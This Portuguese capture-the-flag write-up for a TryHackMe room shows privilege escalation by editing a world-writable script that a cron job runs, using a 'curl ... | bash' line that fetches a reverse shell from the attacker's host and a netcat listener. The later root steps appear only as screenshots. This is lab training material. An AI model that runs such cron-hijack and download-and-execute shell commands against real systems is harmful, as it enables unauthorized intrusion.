🚀 # 🛡️ Exploração da Máquina — 0ff3ns!v3 S3cur!ty - Sw4gg3r

## 🔗 Links

- 💻 **Máquina:** [Google Drive - Máquina](https://drive.google.com/file/d/1XsuWUulDDdktnV6fpPgRIH172iASvVmz/view)
- 🔍 **Prova:** [TryHackMe - 0ff3ns!v3 S3cur!ty - Sw4gg3r](https://tryhackme.com/room/0ff3nsv3s3curtysw4gg3r)

---

## 🧠 Resumo: Como Escalar Privilégios para o Usuário '👑 `swagger`'

### Situação:
- Existe um arquivo chamado `📜`script.sh`` com permissão `777`:
  ```txt
  -rwxrwxrwx 1 user-`swagger` user-`swagger` 184 Jun 1 2023 `script.sh`
  ```
- Isso significa que **qualquer usuário pode ler, escrever e executar** esse arquivo.
- O **dono do arquivo é o usuário '👑 `swagger`'**, que tem mais privilégios que o usuário atual (`👤 `www-data``).

### Problema:
- Estamos logados como `👤 `www-data``, um usuário limitado.
- Executar o script manualmente com `👤 `www-data`` **não eleva os privilégios**, porque o shell reverso retornará com os mesmos direitos de `👤 `www-data``.
![image](https://github.com/user-attachments/assets/b0322b76-b96a-4585-a5cf-a485ee1183bb)
- Por exemplo nesta imagem eu escalei privilégio do meu próprio usuário e consegui, mas não saí do próprio 👤 `www-data`.

### Solução:
1. Editar o 📜 script.sh e **inserir um comando de shell reverso**, por exemplo:
   ```bash
   📡 `  curl http://192.168.100.168:8000/shell_2.sh | bash  `
   ```
2. **Esperar o cron job executá-lo automaticamente** (ele roda a cada minuto).
   - Como o script será executado pelo próprio usuário `👑 `swagger``, o shell reverso retornará com os privilégios dele.

### Conclusão:
- A escalada de privilégios acontece **não quando você executa o script manualmente**, mas quando o **cron do '👑 `swagger`' executa o script que você editou**.

---

### Agora vamos alterar o conteúdo do arquivo e colocá-lo para buscar naquele mesmo servidor Python, baixar e executar o comando do arquivo dentro do bash, enquanto escutamos do outro lado com o NC.
![image](https://github.com/user-attachments/assets/35d15a91-bf21-42f9-b622-afb6d0e2707c)
- Arquivo alterado com a shell. Agora abrimos outro terminal e escutamos na porta 4444 enquanto esperamos a atualização do comando que alteramos para enviar o cmd shell.
![image](https://github.com/user-attachments/assets/c1d126d2-8923-42f5-823d-1ac0c41a0378)

- Temos duas shells ativas agora: uma do 👤 `www-data` que era fraca e não possuía muitos privilégios, e a do 👑 `swagger` que vamos explorar ainda.
![image](https://github.com/user-attachments/assets/26fbd6bc-317c-48f5-9612-7495663d43b5)

# Depois de explorar como 👑 `swagger` Encontramos um arquivo com permissão 775 
![image](https://github.com/user-attachments/assets/f645cf56-c6ce-40f9-98a1-5fec134f9d25)

Conteúdo do .backup:
```txt
#!/bin/bash
##### Script em desenvolvimento visualizar containers ######
###########################################################
######## verificando containers em execução ###############
docker ps
a=$(`docker ps` | cut -d " " -f1 | grep -v "CONTAINER")

######################## Docker Inspect ###################
🔍 `docker inspect` $a
```

# Escalando para 🛡️ `root`
![image](https://github.com/user-attachments/assets/bf139977-d1f1-4cc6-8afa-4439c19f50b9)

# 🖥️ `bash -li` (upgrade de shell)
![image](https://github.com/user-attachments/assets/56ab04c4-f382-4e91-a7e8-df4e53c5df1e)
Agora é só ser feliz.

🐳 `docker ps` / 🔍 `docker inspect`
![image](https://github.com/user-attachments/assets/79e11a7e-da0d-4f7b-83c3-8256d4c53299)

---
🏁 **Flag Root** 
---
![image](https://github.com/user-attachments/assets/e0610da5-e09a-459a-92a7-4b3ffba6163f)
---
![image](https://github.com/user-attachments/assets/edc189b9-5a6e-4a90-9abb-9e85ef9e8758)
---
![image](https://github.com/user-attachments/assets/9b1aa064-ce27-47f1-a1f4-7ce54265b4da)
